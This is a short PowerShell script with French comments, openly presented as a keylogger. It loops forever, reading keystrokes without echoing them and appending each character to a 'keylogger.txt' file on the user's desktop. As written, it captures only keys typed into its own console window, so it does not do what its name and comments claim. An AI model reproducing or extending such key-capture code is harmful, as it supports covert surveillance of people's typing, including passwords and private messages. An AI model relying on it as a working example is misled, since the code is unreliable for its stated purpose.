# Créer un objet pour enregistrer les frappes dans un fichier texte
$logfile = "$env:userprofile\Desktop\keylogger.txt"

# Fonction pour détecter les frappes du clavier
function Get-KeyPress {
    $key = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    return $key.Character
}

# Boucle infinie pour surveiller les frappes
while ($true) {
    $key = Get-KeyPress
    if ($key -ne "`0") { 
        Add-Content -Path $logfile -Value $key
    }
}
